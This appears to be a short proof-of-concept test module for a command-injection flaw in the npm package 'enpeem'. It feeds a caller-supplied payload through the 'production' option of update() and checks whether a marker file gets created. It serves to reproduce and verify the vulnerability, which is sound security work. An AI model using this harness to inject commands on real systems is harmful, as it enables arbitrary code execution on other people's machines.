function exploitFunction(payload) {
  const root = require("enpeem");
  const fs = require("fs");
  const path = "./enpeem";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let opts = { production: payload };
  root.update(opts, function (err) {
    console.log("err!");
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
  });
}

module.exports = { exploitFunction };